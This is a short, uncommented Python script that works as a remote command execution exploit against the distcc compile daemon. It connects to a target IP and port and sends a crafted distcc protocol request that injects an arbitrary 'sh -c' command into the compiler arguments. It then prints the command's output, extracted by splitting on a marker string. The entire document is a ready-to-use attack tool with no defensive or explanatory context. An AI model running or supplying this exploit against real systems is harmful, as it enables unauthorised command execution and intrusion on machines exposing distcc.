#!/usr/bin/env python3

import socket
import sys


if len(sys.argv) != 4:
    print(f"{sys.argv[0]} [ip] [port] [command]")
    sys.exit(1)
_, ip, port, cmd = sys.argv
mask = "0xdffdx0"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, int(port)))
full_cmd = f"sh -c '(echo -n {mask};{cmd};echo -n {mask})'"
payload = f"""DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV{len(full_cmd):8x}{full_cmd}ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002-               oARGV00000006main.oDOTI00000001A"""
s.send(payload.encode())
resp = s.recv(4096)
print(resp.decode(errors="ignore").split(mask)[1].strip())
